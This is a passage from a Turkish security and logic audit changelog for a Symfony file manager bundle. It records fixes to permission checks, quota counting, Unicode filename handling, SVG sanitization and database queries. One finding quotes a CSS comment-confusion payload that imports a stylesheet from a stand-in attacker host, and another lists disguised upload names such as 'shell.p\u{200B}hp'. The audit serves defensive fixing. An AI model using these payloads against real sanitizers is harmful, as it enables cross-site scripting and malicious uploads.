  - **Yapılan Değişiklik:** `FileManagerAuthorizer::isGranted()` içinde anahtar `$profile->permissions` dizisinde yoksa `extract_zip` için `false` (`$configKey !== 'extract_zip'`) dönecek şekilde sıkılaştırıldı; `YamlConfigProvider::hydrateProfile()` içinde ise `zip.allow_extract: true` açıkça verildiğinde ve `permissions.extract_zip` belirtilmediğinde `permissions['extract_zip'] = true` eşlemesi yapıldı.

- [x] **G-09 [ORTA] Frontend `isSafeUrl()` / `isSafeHttpOrPathUrl()` — Gömülü Kimlik Bilgisi (`https://user:pass@host`) Kontrolü**
  - **Dosyalar:** `assets/controllers/browser_controller.js`, `assets/controllers/picker_controller.js`, `assets/js/integrations/ckeditor5_adapter.js`, `assets/js/integrations/tinymce_adapter.js`, `assets/js/integrations/tiptap_adapter.js`
  - **Bulgu:** Backend `user:pass@` içeren URL'leri reddederken JS tarafındaki 5 URL doğrulayıcı `new URL(s)` sonrasında `!parsed.username && !parsed.password` kontrolü yapmamaktaydı.
  - **Yapılan Değişiklik:** 5 JS dosyasındaki tüm URL doğrulayıcılarına `!parsed.username && !parsed.password` kontrolü eklendi.

---

### 3.2. Çapraz Fonksiyon Mantık Hataları ve Veri / Kota Çelişkileri (M-01 – M-07)

- [x] **M-01 [YÜKSEK] `TrashManager::restore()` vs `StorageQuotaChecker` — Çöp Kutusundan Geri Yüklemede Çift Kota Sayımı ve Noktalı Klasör Adı Bozulması**
  - **Dosya:** `src/Service/TrashManager.php`
  - **Bulgu:**
    1. `StorageQuotaChecker` çöp kutusundaki dosyaları zaten `usedBytes` içine dahil etmektedir. `TrashManager::restore()` `assertHasQuota($profile, $volume->name, $entry->size)` çağırdığı için çöp kutusundaki dosyanın boyutu iki kez sayılmakta ve kotanın %50'sinden fazlasını kullanan bir dosyanın çöp kutusundan geri yüklenmesi (`0 byte` net artış olduğu halde) engellenmekteydi.
    2. `resolveUniqueRestorePath()` klasörler için de `stemUtf8()` / `extensionUtf8()` kullandığından, adı nokta içeren bir klasör (`v1.0.release`) çakışma anında `v1.0_restored_120000.release` olarak bozulmaktaydı.
  - **Yapılan Değişiklik:**
    1. `TrashManager::restore()` içindeki çift sayım yapan `assertHasQuota(..., $entry->size)` kaldırıldı.
    2. `resolveUniqueRestorePath()` içine `bool $isFolder = false` parametresi eklendi; klasörlerde nokta uzantı olarak bölünmeden tam klasör adına `_restored_...` eklendi ve kesme işlemi `UnicodeHelper::truncateStemBytes($rawBase, 180)` ile yapıldı.

- [x] **M-02 [YÜKSEK] `DirectoryCacheManager::extractVolumeScope()` — 8 Haneli Tarih veya Hex Klasörlerinin (`20261124/`) Volume Cache İptalini Kırması**
  - **Dosyalar:** `src/Security/PathNormalizer.php`, `src/Service/DirectoryCacheManager.php`
  - **Bulgu:** `extractVolumeScope()` `local::<rest>` üzerinde `/^([0-9a-f]{8})(?:\/|$)/` aradığı için, kök dizindeki `20261124/` gibi 8 haneli tarih klasörlerini harici volume hash'i sanmakta ve `local::20261124` scope'una ayırmaktaydı.
  - **Yapılan Değişiklik:** `PathNormalizer::computeRelativeToBase()` harici yerel volume hash'lerini `@ext_<8hex>` önekiyle üretecek şekilde güncellendi; `DirectoryCacheManager::extractVolumeScope()` yalnızca `/^(@ext_[0-9a-f]{8})(?:\/|$)/` önekini harici volume scope'u olarak ayırdı.

- [x] **M-03 [ORTA-YÜKSEK] `DoctrineDbalMetadataStorage::relocatePrefix()` — Örtüşen Prefix Taşımalarında Yeni Eklenen Kaydın Aynı Döngüde Silinmesi**
  - **Dosya:** `src/Bridge/Doctrine/DoctrineDbalMetadataStorage.php`
  - **Bulgu:** `relocatePrefix()` tek döngüde `$tx->delete($oldHash)` ve `$tx->insert($newHash)` çalıştırdığı için `$oldCanonicalPrefix` ile `$newCanonicalPrefix` örtüştüğünde 2. satırın `$oldHash` silmesi 1. satırın yeni eklediği `$newHash` kaydını silebilmekteydi.
  - **Yapılan Değişiklik:** Transaction içinde önce tüm `$staleTargetHashes` ve tüm `$matched` satırlarının `$oldHash` kayıtları silindi, ardından ikinci bir döngüde tüm `$newHash` kayıtları eklendi.

- [x] **M-04 [ORTA-YÜKSEK] `UploadManager`, `ZipArchiveService` ve `OptimizeImagesCommand` — WebP Dönüşümü Sonrası Çift `prepend`/`append`, Eksik `upload_allow`/`exclude_patterns` ve Döngü İçi Kota Kontrolü**
  - **Dosyalar:** `src/Service/UploadManager.php`, `src/Service/ZipArchiveService.php`, `src/Command/OptimizeImagesCommand.php`
  - **Bulgu:**
    1. `UploadManager::finalizeFile()` WebP dönüşümü sonrasında `normalizeForUpload()` metodunu ikinci kez çağırarak `naming.prepend` ve `naming.append` eklerini iki kez uygulamaktaydı.
    2. `ZipArchiveService::validateOptimizeAndConstrainExtractedFile()` ve `OptimizeImagesCommand` WebP dönüşümü sonrası yeni MIME türünü (`image/webp`) `upload_allow`/`upload_deny` listesine karşı ve `OptimizeImagesCommand` yeni `.webp` yolunu `isPathIgnored()` kuralına karşı kontrol etmemekteydi.
    3. `ZipArchiveService::extractArchive()` `resolveExtractFileCollision()` sonrasında `assertAccessiblePath($destPath, $profile)` çağırmamakta ve `$eventDispatcher === null` iken kümülatif eklenen byte yerine tek dosyanın `$deltaBytes` değerini kontrol etmekteydi.
  - **Yapılan Değişiklik:**
    1. `UploadManager::finalizeFile()` WebP dönüşümü sonrasında `normalizeForUpload()`'u tekrar çağırmak yerine `$optimized['filename']` üzerinde `validateMimeType()` çalıştırdı.
    2. `ZipArchiveService` ve `OptimizeImagesCommand` WebP dönüşümü sonrası `upload_allow`/`upload_deny` ve `assertAccessiblePath`/`isPathIgnored` kontrollerini uyguladı; `ZipArchiveService::extractArchive()` kümülatif `$cumulativeDeltaBytes` takip ederek kota kontrolü yaptı.

- [x] **M-05 [ORTA] `SAFE_TEXT_PREVIEW_EXTENSIONS` / `EnrichMetadataCommand` vs `FileSecurityGuard::BLOCKED_EXTENSIONS` (`xml`, `js`, `mjs`) Çelişkisi**
  - **Dosyalar:** `src/Controller/ApiController.php`, `src/Command/EnrichMetadataCommand.php`, `src/Bridge/SymfonyAI/SymfonyAiAssetEnricher.php`
  - **Bulgu:** `xml`, `js`, `mjs` uzantıları `FileSecurityGuard::BLOCKED_EXTENSIONS` içinde engellendiği halde `ApiController::SAFE_TEXT_PREVIEW_EXTENSIONS`, `EnrichMetadataCommand::SUPPORTED_EXTENSIONS` ve `SymfonyAiAssetEnricher::TEXT_MIMES` içinde listelenmişti.
  - **Yapılan Değişiklik:** Güvenlik politikasıyla (`FileSecurityGuard::BLOCKED_EXTENSIONS`) tam tutarlılık için `SAFE_TEXT_PREVIEW_EXTENSIONS`, `EnrichMetadataCommand::SUPPORTED_EXTENSIONS` ve `SymfonyAiAssetEnricher::TEXT_MIMES` listelerinden `xml`, `js`, `mjs` (`text/xml`, `application/xml`) çıkarıldı.

- [x] **M-06 [ORTA] `RemoteUrlImporter::extractFilename()` — Dinamik Endpoint'lerden (`/image.php`, `/render.html`) İndirilen Geçerli Görsellerin `.php`/`.html` Uzantısıyla Reddedilmesi**
  - **Dosya:** `src/Service/RemoteUrlImporter.php`
  - **Bulgu:** Uzak URL veya `Content-Disposition` başlığı `.php`/`.html` gibi engelli bir uzantı taşıdığında fakat indirilen dosyanın gerçek içeriği `image/png` veya `image/jpeg` olduğunda, `extractFilename()` tehlikeli uzantıyı korumakta ve `UploadManager` dosyayı reddetmekteydi.
  - **Yapılan Değişiklik:** `extractFilename()` içinde aday uzantı `FileSecurityGuard::BLOCKED_EXTENSIONS` listesindeyse reddedilip gerçek `$detectedMime` üzerinden güvenli uzantı (`.png`, `.jpg`, `.webp` vb.) belirlendi.

- [x] **M-07 [ORTA] `EnrichMetadataCommand` — Private Volume `--dry-run` Tutarsızlığı ve `tags: []` Sonsuz Tekrar Çağrısı**
  - **Dosya:** `src/Command/EnrichMetadataCommand.php`
  - **Bulgu:**
    1. `ai.block_private_volumes: true` iken `private: true` bir volume `--dry-run` modunda başarılı sayılıp gerçek çalıştırmada hata vermekteydi.
    2. `hasExistingEditorialMetadata()` yalnızca `$meta->alt !== null && $meta->tags !== []` kontrolü yaptığı için, AI `alt`/`title`/`caption` döndürüp `tags: []` bıraktığında sonraki çalıştırmalarda aynı dosyayı tekrar AI servisine göndermekteydi.
  - **Yapılan Değişiklik:** Volume döngüsü başında `$volume->private && ($profile->ai['block_private_volumes'] ?? true) === true` kontrolü yapılarak private volume'ler hem dry-run hem normal modda bilgi mesajıyla atlandı; `hasExistingEditorialMetadata()` `$meta->alt !== null && ($meta->tags !== [] || $meta->title !== null || $meta->caption !== null)` olarak güncellendi.

---

### 3.3. Global Çok-Dilli, Unicode, IME ve RTL Bulguları (U-01 – U-08)

- [x] **U-01 [YÜKSEK] Klasör Adlarında ve Dosya Yeniden Adlandırmada Nokta (`.`) + Boşluk / ZWNJ / Uzantısız Giriş Reddi**
  - **Dosyalar:** `src/Security/FileSecurityGuard.php`, `src/Service/FilenameNormalizer.php`, `src/Service/ZipArchiveService.php`, `src/Service/TrashManager.php`, `src/Service/FileOperationsService.php`
  - **Bulgu:**
    1. `FilenameNormalizer::normalizeFolderName()` ve `ZipArchiveService::normalizeAndValidateArchivePath()` klasör adları üzerinde `FileSecurityGuard::assertSafeFilename()` çağırdığı için `"Acme. Co"`, `"Dr. John"`, `"v1.0 beta"`, `"v1.0_می‌خواهم"`, `"nextjs.js"` gibi nokta içeren klasör adlarını reddetmekteydi.
    2. `FilenameNormalizer::normalizeForRename()` içinde kullanıcı `"avatar.jpg"` dosyasını yeniden adlandırırken uzantıyı yazmadan `"Dr. Smith"` veya `"v1.0"` yazdığında (`allow_extension_change: false`), mevcut `.jpg` uzantısını korumak yerine hata fırlatmaktaydı.
  - **Yapılan Değişiklik:**
    1. `FileSecurityGuard::assertSafeFolderName()` metodu eklendi; `FilenameNormalizer::normalizeFolderName()`, `TrashManager`, `FileOperationsService` ve `ZipArchiveService` klasör segmentlerinde bu metodu kullandı.
    2. `FilenameNormalizer::normalizeForRename()` içinde `isStemInternalDotNotExtension()` eklenerek kullanıcının uzantıyı yazmadan nokta içeren bir gövde (`"Dr. Smith"`, `"v1.0"`) girdiği durumlarda `$currentExt` korundu.

- [x] **U-02 [YÜKSEK] `PathNormalizer::normalize()` NFC Normalizasyonu Eksikliği Nedeniyle macOS APFS (NFD) Altında `substr($cleanItem, strlen($sourceDir))` UTF-8 Byte Parçalanması**
  - **Dosyalar:** `src/Security/PathNormalizer.php`, `src/Service/StorageQuotaChecker.php`
  - **Bulgu:** `PathNormalizer::normalize()` yolları NFC'ye dönüştürmeden döndürdüğü için, macOS APFS (`listContents` NFD: `"c\u{0327}o\u{0308}p"` = 7 byte) ile istemci NFC (`"çöp"` = 5 byte) birleştiğinde `substr($cleanItem, strlen($sourceDir))` çok baytlı birleştirici karakteri ortadan ikiye bölebilmekteydi.
  - **Yapılan Değişiklik:** `PathNormalizer::normalize()` her segmenti hem ham hem NFC formunda doğruladıktan sonra kanonik **NFC** olarak döndürdü; `StorageQuotaChecker` da `$trashDir` ve `$attr->path()` üzerinde `PathNormalizer::normalize()` / `UnicodeHelper::toNfc()` kullandı.

- [x] **U-03 [YÜKSEK] Hangul Filler (`\p{L}`), Variation Selector (`\p{M}`) ve 200-Byte Kesme Sonrası Açığa Çıkan Görünmez Karakterler (`"-️.jpg"`, Farsça ZWNJ / Emoji ZWJ Kesme Hatası)**
  - **Dosyalar:** `src/Util/UnicodeHelper.php`, `src/Service/FilenameNormalizer.php`, `src/Service/ZipArchiveService.php`, `src/Service/RemoteUrlImporter.php`, `src/Controller/ImageEditorController.php`
  - **Bulgu:**
    1. Korece Hangul Filler (`U+115F`, `U+1160`, `U+3164`, `U+FFA0`) PCRE'de `\p{L}`, Emoji Variation Selector (`U+FE00..U+FE0F`) ise `\p{M}` kategorisinde olduğu için `/[^\p{L}\p{M}\p{N}_-]+/u` regex'i `"👁️‍🗨️.jpg"` için `"-️.jpg"` ve `"🚀\u{3164}.jpg"` için `"\u{3164}.jpg"` üretmekteydi.
    2. `UnicodeHelper::truncateStemBytes()` 200. byte'tan kestiğinde kelime ortasındaki Farsça ZWNJ (`U+200C`), Hintçe/Emoji ZWJ (`U+200D`) veya CJK noktası (`．`, `。`) sonda kalabilmekteydi.
  - **Yapılan Değişiklik:** `UnicodeHelper::stripIgnorableFillers()` ve `UnicodeHelper::trimEdgeInvisiblesAndDots()` metodları eklendi; `truncateStemBytes()`, `FilenameNormalizer`, `ZipArchiveService`, `RemoteUrlImporter` ve `ImageEditorController` içinde kenar görünmez karakterler, CJK noktaları, Hangul/Khmer filler'lar ve tireye yapışık variation selector / combining mark'lar (`(?<=^|-)[\p{M}]+`) temizlendi.

- [x] **U-04 [ORTA] `AssetEnrichmentResult::sanitizeText()` — `mb_scrub`, NFC, C1 (`\x80-\x9F`) ve BiDi (`\u{202A}-\u{202E}`) Temizliği**
  - **Dosya:** `src/AI/AssetEnrichmentResult.php`
  - **Bulgu:** `AssetEnrichmentResult::sanitizeText()` bozuk UTF-8 (`mb_scrub`), NFC normalizasyonu, C1 kontrolleri ve BiDi override temizliği yapmamaktaydı.
  - **Yapılan Değişiklik:** `AssetEnrichmentResult::sanitizeText()` içinde `UnicodeHelper::toNfc(mb_scrub($value, 'UTF-8'))` ve C0/C1/BiDi temizliği uygulandı.

- [x] **U-05 [ORTA] Dosya Boyutu (`formatBytes`) ve Çöp Kutusu Tarihi (`deletedAtTs`) Yerelleştirmesi**
  - **Dosyalar:** `assets/controllers/browser_controller.js`, `src/Controller/ApiController.php`
  - **Bulgu:** Kartlar, liste görünümü, inspector ve kota modalı `this.formatBytes(bytes)` yerine sunucudan gelen sabit İngilizce `sizeFormatted` / `usedFormatted` stringlerini göstermekte; `ApiController::trash()` ise `deletedAtTs` timestamp göndermemekteydi.
  - **Yapılan Değişiklik:** `browser_controller.js` sayısal byte değeri mevcut olduğunda `this.formatBytes(...)` kullandı; `ApiController::trash()` yanıtına `'deletedAtTs' => $e->deletedAt` eklendi ve `renderTrash()` içinde `this.formatDate(e.deletedAtTs)` kullanıldı.

- [x] **U-06 [ORTA] `onTreeSearchInput` & `openMoveModal` IME (`event.isComposing`) Koruması ve JS `foldSearch()` Yunanca Final Sigma (`ς` → `σ`) Eşitlemesi**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** `onTreeSearchInput` ve Taşı/Kopyala modalındaki arama alanı `event?.isComposing` kontrolü yapmamakta; JS `foldSearch()` içinde Yunanca `.replace(/ς/g, 'σ')` dönüşümü bulunmamaktaydı.
  - **Yapılan Değişiklik:** `onTreeSearchInput` ve `[data-move-search]` (hem `input` hem `compositionend` dinleyerek) `event?.isComposing` korumasına alındı; `foldSearch()` içine `.replace(/ς/g, 'σ')` eklendi.

- [x] **U-07 [DÜŞÜK-ORTA] RTL (`dir="rtl"`) Lightbox Kod/Hata Hizalaması (`.liveux-fm-lightbox-code`) ve Çöp Kutusu "Geri" (`←`) İkonu Yönü**
  - **Dosyalar:** `assets/styles/core.css`, `assets/controllers/browser_controller.js`
  - **Bulgu:** `.liveux-fm-lightbox-code` sabit `text-align: left` kullandığı için RTL hata mesajlarını sola yaslamakta, `<pre>` kod önizlemesinde ise `direction: ltr` eksik kalmaktaydı; ayrıca `renderTrash()` içindeki "Geri" butonu sabit `←` karakteri kullanmaktaydı.
  - **Yapılan Değişiklik:** `core.css` içinde `.liveux-fm-lightbox-code { text-align: start; }` ve `pre.liveux-fm-lightbox-code { direction: ltr; text-align: left; unicode-bidi: isolate; }` olarak ayrıldı; `renderTrash()` geri butonunda `this.isRtl() ? '→' : '←'` kullanıldı.

- [x] **U-08 [DÜŞÜK-ORTA] `IconSetRegistry::loadExtensibleMap()` — C-Locale Bağımlı `pathinfo()` ve `glob()` Metakarakter Kırılması**
  - **Dosya:** `src/Icon/IconSetRegistry.php`
  - **Bulgu:** Özel ikon dizini yolunda ASCII olmayan karakterler veya `[` / `]` bulunduğunda `glob()` ve `pathinfo(..., PATHINFO_FILENAME)` kırılabilmekteydi.
  - **Yapılan Değişiklik:** `scandir($customSubDir)` + `PathNormalizer::extensionUtf8($entry) === 'svg'` + `PathNormalizer::stemUtf8($entry)` kullanıldı.

---

## 4. Rapor & Dokümantasyon ile Gerçek Kod Arasındaki Tutarsızlık Denetimi (`T-01` – `T-08`)

> **Denetçi Model:** Google Antigravity — Gemini (High Reasoning Mode) | **Tarih:** 24.11.2026

8. tur başlangıcında bu raporun 1–7. tur kayıtları ve `docs/tr/01..13` dokümanları gerçek kaynak kodlarla satır-satır karşılaştırılmış; raporda/dokümanlarda "tamamlandı" denilen ancak kodda kısmi kalan veya yan etki oluşturan aşağıdaki **8 tutarsızlık (`T-01` – `T-08`)** tespit edilerek tamamen giderilmiştir:

- [x] **T-01 [KRİTİK] Rapor `G-01` vs. `SvgSanitizer.php` & `browser_controller.js` — Tırnak Dışı Backslash-Escape (`\/*` + `@im/**/port`) ve `sanitizeInlineSvg()` Sunum Özniteliği Uyumsuzluğu**
  - **Dosyalar:** `src/Security/SvgSanitizer.php`, `assets/controllers/browser_controller.js`
  - **Tespit Edilen Tutarsızlık:**
    1. Rapor `G-01`'de CSS yorum/lexer senkron kaymasının kapatıldığı belirtilmişti. Ancak W3C CSS Syntax Level 3 §4.3.1'e göre tırnak dışındaki `\/*` ifadesinde `\/` kaçırılmış bir slash karakteridir ve ardından gelen `*` yorum başlatmaz. `stripCssCommentsPreservingStrings()` tırnak dışındaki `\\.` escape dizilerini tüketmediği için `@unknown \/*; @im/**/port "https://evil.example/xss.css";` payload'ında `\/*` içindeki `/*`'ı yorum başlangıcı sanıp `@im/*` sonuna kadar silmekte ve `@import` ifadesini kaçırmaktaydı (ayrıca yorum silme sonrası kalan eşleşmemiş `*/` kontrol edilmemekteydi).
    2. `browser_controller.js` içinde `hasUnsafeSvgCss()` CSS satır devamı (`\\(?:\r\n|[\r\n\f])`) escape'ini silmemekte (`u\\\nrl(...)` bypass'ı); `sanitizeInlineSvg()` ise `style` özniteliğini doğrudan silerken `URL_PRESENTATION_ATTRIBUTES` (`fill`, `filter`, `clip-path`, `mask` vb.) üzerinde `this.hasUnsafeSvgCss()` metodunu hiç çağırmamakta ve `xml:base` özniteliğini temizlememekteydi.
  - **Yapılan Düzeltme:**
    1. Hem `SvgSanitizer::stripCssCommentsPreservingStrings()` hem `browser_controller.js::hasUnsafeSvgCss()` regex'ine tırnak dışı `\\\\.` tüketimi eklendi; yorum silme sonrasında hem `/*` hem `*/` kalıntısı reddedildi ve `$rawDecoded` üzerinde yorum temizliği sonrası ikinci bir token taraması zorunlu kılındı.
    2. `SvgSanitizer::isDangerousAttributeValue()` ve `browser_controller.js::sanitizeInlineSvg()` içinde `#` ile başlayan yerel `href`/`xlink:href`/`src` referansları `/^#[a-z0-9_.:-]+$/i` ile sınırlandırıldı; `browser_controller.js::sanitizeInlineSvg()` içine `xml:base` silme ve tüm SVG sunum özniteliklerinde `this.hasUnsafeSvgCss()` kontrolü eklendi.

- [x] **T-02 [YÜKSEK] Rapor `G-07` vs. `FileManagerPickerType::isSafePickerValue()` — Varsayılan `return_type: 'url'` Modunda `assertSafeFilename()`, `aux。jpg`, Çift Uzantı ve Gizli Klasör Kontrolü Eksikliği**
  - **Dosya:** `src/Form/FileManagerPickerType.php`
  - **Tespit Edilen Tutarsızlık:** Rapor `G-07`'de `isSafePickerValue()` içine hem `path` hem `url` için `.trash`, gizli dot-segmentler ve `FileSecurityGuard::assertSafeFilename()` (`aux。jpg` dahil) eklendiği yazılmıştı. Ancak `return_type === 'url'` (varsayılan mod) dalında `$guard->assertSafeFilename()` yalnızca `?path=` query parametresi varsa çağrılmakta; doğrudan URL'lerde (`/uploads/aux。jpg`, `/uploads/con.jpg`, `/uploads/exploit.php.jpg`, `/uploads/shell.p\u{200B}hp`, `/uploads/.secret/photo.jpg`) `$baseLeaf` üzerinde `assertSafeFilename()` ve segmentlerde `str_starts_with($foldedSeg, '.')` kontrolü yapılmamaktaydı.
  - **Yapılan Düzeltme:** `return_type === 'url'` dalında URL path segmentlerinin tamamında `str_starts_with($foldedSeg, '.')` (gizli klasör/dosya ve CJK nokta karşılıkları `。hidden`) engellendi ve doğrudan dosya URL'lerinin (`$queryPart === '' && $baseLeaf !== ''`) `$baseLeaf` değeri üzerinde `$guard->assertSafeFilename($baseLeaf)` zorunlu tutuldu.

- [x] **T-03 [YÜKSEK] Rapor `G-08` & Bölüm 2.1 vs. `Configuration.php`, `ProfileConfig.php`, `FileManagerVoter.php`, `FileManagerAuthorizer.php` — Symfony DI Derlemesinde `extract_zip` `defaultFalse()` Çakışması ve `getPermissionRule()` Farklılığı**
  - **Dosyalar:** `src/DependencyInjection/Configuration.php`, `src/Config/ProfileConfig.php`, `src/Security/FileManagerVoter.php`, `src/Security/FileManagerAuthorizer.php`
  - **Tespit Edilen Tutarsızlık:**
    1. Rapor `G-08`'de `zip.allow_extract: true` verildiğinde ve `permissions.extract_zip` belirtilmediğinde `YamlConfigProvider` içinde `permissions['extract_zip'] = true` eşlemesi yapıldığı yazılmıştı. Ancak `Configuration.php` satır 492'de `extract_zip` düğümü `->defaultFalse()` olduğu için Symfony DI `Processor` her zaman `permissions['extract_zip'] = false` anahtarını üretmekte ve `YamlConfigProvider` içindeki `!array_key_exists('extract_zip', $permissions)` koşulu gerçek Symfony container'ında devreye girmemekteydi.
    2. `ProfileConfig::getPermissionRule($action)` (`FileManagerVoter` tarafından kullanılır) dizide olmayan anahtarlar için `false` döndürürken, `FileManagerAuthorizer` dizide olmayan anahtarlar için `$configKey !== 'extract_zip'` (`true`) döndürmekteydi; ayrıca `FileManagerVoter` içinde `'view'` anahtarı dizide yoksa `'view'` temel kapısı diğer aksiyonlarda atlanmaktaydı.
  - **Yapılan Düzeltme:**
    1. `Configuration::addProfilesNode()` içine `beforeNormalization()` eklenerek kullanıcı `zip.allow_extract: true` verip `permissions.extract_zip` anahtarını açıkça yazmadığında DI derleme aşamasında `permissions.extract_zip = true` atanması sağlandı (`permissions.extract_zip: false` açıkça yazılmışsa `false` korundu).
    2. `ProfileConfig::getPermissionRule()` eksik anahtarlarda `'extract_zip'` için `($this->zip['allow_extract'] ?? false) === true`, diğer standart izinler için `true` döndürecek şekilde merkezileştirildi; hem `FileManagerVoter` hem `FileManagerAuthorizer` doğrudan `$profile->getPermissionRule()` ve koşulsuz `'view'` temel kapısını kullanacak şekilde birebir eşitlendi.

- [x] **T-04 [YÜKSEK] Rapor `G-03` & `G-05` vs. `TrashManager`, `FileOperationsService`, `UploadManager`, `ZipArchiveService`, `ApiController` — FIFO Çöp Kutusu Tahliyesinde Alt-Öğe `TRASH_PURGE` Atlaması ve Eksik `FILE_MANAGER_VIEW` Kontrolleri**
  - **Dosyalar:** `src/Service/TrashManager.php`, `src/Service/FileOperationsService.php`, `src/Service/UploadManager.php`, `src/Service/ZipArchiveService.php`, `src/Controller/ApiController.php`
  - **Tespit Edilen Tutarsızlık:**
    1. `TrashManager::planFifoTrashEvictions()` `trash.max_size` aşımında eski çöp öğelerini tahliye ederken klasörlerin yalnızca kök yolunda `TRASH_PURGE` kontrolü yapmakta, klasörün içindeki alt öğelerde `validateTrashedFolderContentsForPurge()` çalıştırmamaktaydı; ayrıca `validateTrashedFolderContentsForPurge()` `5.000` öğe sınırında hata fırlatmak yerine `break` ile döngüden çıkmaktaydı.
    2. `FileOperationsService::createFolder()`, `FileOperationsService::validateDirectoryContentsForDelete()`, `UploadManager` ve `ZipArchiveService` üzerine yazma (`overwrite`), `TrashManager` (`canViewTrashEntry`, `restore`, `deletePermanently`, `validateTrashedFolderContentsForPurge`, `validateRestoredFolderContents`) ve `ApiController` (`trash`, `hasAnyVisibleTrashPermission`, `handleCheckUsage`, `handleDelete` ön-doğrulama) içinde `FILE_MANAGER_VIEW` kontrolü (ve `handleDelete` ön-doğrulamasında `assertNotTrashAncestor`) eksik bırakılmıştı.
  - **Yapılan Düzeltme:** `TrashManager::canEvictTrashEntry()` ile FIFO tahliyesinde klasör alt öğeleri için de `VIEW` + `TRASH_PURGE` kontrolü zorunlu kılındı; `validateTrashedFolderContentsForPurge()` `MAX_TRASH_MOVE_ITEMS` aşımında fail-closed `FileManagerException` fırlatacak şekilde güncellendi; yukarıdaki tüm servis ve controller noktalarına `FILE_MANAGER_VIEW` (ve `handleDelete` ön-doğrulamasına `assertNotTrashAncestor`) eklendi.

- [x] **T-05 [YÜKSEK] Rapor `G-05` & `13-doctrine-entegrasyonu.md` vs. `DoctrineDbalMetadataStorage`, `DirectoryLister` & `MetadataSyncListener` — "Tek SELECT / Sıfır N+1" İddiasına Karşı N+1 SQL Sorgusu ve `pruneOrphanCopiedMetadata()` Tam Tablo Taraması (`all()`)**
  - **Dosyalar:** `src/Bridge/Doctrine/DoctrineDbalMetadataStorage.php`, `src/Metadata/JsonFileMetadataStorage.php`, `src/Service/DirectoryLister.php`, `src/EventListener/MetadataSyncListener.php`
  - **Tespit Edilen Tutarsızlık:**
    1. `13-doctrine-entegrasyonu.md` satır 54'te `DoctrineDbalMetadataStorage`'ın 1.000 dosya listelense bile istek başına tek bir `SELECT` sorgusu attığı yazılmıştı. Oysa `DirectoryLister::list()` (`hydrateAndFilter`) ve `listFullTree()` her dosya/klasör için döngü içinde `$this->metadataStorage->get($canonical)` çağırdığından `$this->memoryCache === null` iken öğe başına ayrı bir SQL `SELECT` (1.000+ N+1 sorgu) çalışmaktaydı.
    2. 7. turda (`G-05`) eklenen `MetadataSyncListener::pruneOrphanCopiedMetadata()` ise `$this->metadataStorage->all()` çağırarak tüm kiracıların tüm veritabanı tablosunu RAM'e çekmekte ve her metadata satırı için 2 ayrı `$fs->fileExists()` + `$fs->directoryExists()` çağrısı yapmaktaydı.
  - **Yapılan Düzeltme:**
    1. `DoctrineDbalMetadataStorage::preload(array $canonicalKeys)` metodu eklendi (`WHERE key_hash IN (...)` ile 400'lük bloklar halinde tek sorguda `$itemCache` ısıtma; veritabanında kaydı olmayan anahtarlar da boş `FolderMetadata` olarak `$itemCache`'e yazılarak tekrar sorgulanması önlendi). `DirectoryLister::listFullTree()` ve `hydrateAndFilter()` döngü öncesinde `preload()` çağırarak N+1 SQL sorgularını sıfırladı.
    2. `DoctrineDbalMetadataStorage::getByPrefix()` ve `JsonFileMetadataStorage::getByPrefix()` eklendi; `MetadataSyncListener::pruneOrphanCopiedMetadata()` içinde `all()` yerine `getByPrefix($targetCanonicalPrefix)` ve N+1 `fileExists`/`directoryExists` yerine tek bir `$fs->listContents($targetFolderPath, true)` hash-set taraması kullanıldı.

- [x] **T-06 [YÜKSEK] Rapor `M-04` vs. `ZipArchiveService::extractArchive()` — `EventDispatcher` Aktifken Döngü İçi `__quota__` Cache İptali Nedeniyle Çift Kota Sayımı**
  - **Dosya:** `src/Service/ZipArchiveService.php`
  - **Tespit Edilen Tutarsızlık:** Rapor `M-04`'te `ZipArchiveService::extractArchive()` içinde `$cumulativeDeltaBytes` ile kota kontrolünün düzeltildiği belirtilmişti. Ancak gerçek Symfony ortamında (`$this->eventDispatcher !== null`) her çıkarılan dosya `FileUploadedEvent` fırlatıp `CacheInvalidationListener` üzerinden `__quota__` önbelleğini sildiği için, sonraki dosyada `assertHasQuota(..., $cumulativeDeltaBytes)` çağrıldığında diskten yeniden taranan `usedBytes` (önceki çıkarılan dosyaları zaten içerir) üzerine bir de `$cumulativeDeltaBytes` eklenerek çıkarılan dosyalar iki kez sayılmaktaydı.
  - **Yapılan Düzeltme:** `extractArchive()` başında `$initialUsedBytes` ve `$maxQuotaBytes` kaydedildi; her dosyada net değişim (`$netDelta = $finalBytes - $existingBytes`) `$cumulativeNetDelta` üzerine eklenerek `($initialUsedBytes + $cumulativeNetDelta) > $maxQuotaBytes` kontrolüyle hem çift sayım hem de döngü içi tekrarlı disk taraması tamamen ortadan kaldırıldı.

- [x] **T-07 [ORTA-YÜKSEK] Rapor `M-05`, `M-06`, `U-01` vs. `browser_controller.js`, `RemoteUrlImporter.php`, `FilenameNormalizer.php` — Frontend `TEXT_PREVIEW_EXTENSIONS`, Uzak URL Gövde/MIME Uzlaştırması ve Noktalı Rename (`v1.0-rc1`, `Dr.Smith`)**
  - **Dosyalar:** `assets/controllers/browser_controller.js`, `src/Service/RemoteUrlImporter.php`, `src/Service/FilenameNormalizer.php`
  - **Tespit Edilen Tutarsızlık:**
    1. `M-05` kapsamında backend `SAFE_TEXT_PREVIEW_EXTENSIONS` listesinden `xml`, `js`, `mjs` çıkarıldığı halde `browser_controller.js` `TEXT_PREVIEW_EXTENSIONS` içinde bırakılmıştı.
    2. `M-06` kapsamında `RemoteUrlImporter::extractFilename()` yalnızca son uzantının `BLOCKED_EXTENSIONS` içinde olup olmadığına baktığından `render.php.png` veya `aux.jpg` gibi URL'lerde gövdeyi temizlemeden döndürmekte; `avatar.json` / `download.bin` gibi raster olmayan URL uzantılarında ise `image/png` içeriği `.png`'ye çevirmemekteydi.
    3. `U-01` kapsamında `FilenameNormalizer::isStemInternalDotNotExtension()` noktadan sonra boşluk olmayan `"v1.0-rc1"`, `"v1.0_final"`, `"Dr.Smith"` gibi geçerli gövdeleri `/^[a-z0-9_+-]{1,12}$/i` eşleştiği için uzantı değişimi sanıp reddetmekteydi.
  - **Yapılan Düzeltme:**
    1. `browser_controller.js` `TEXT_PREVIEW_EXTENSIONS` kümesinden `xml`, `js`, `mjs` çıkarıldı.
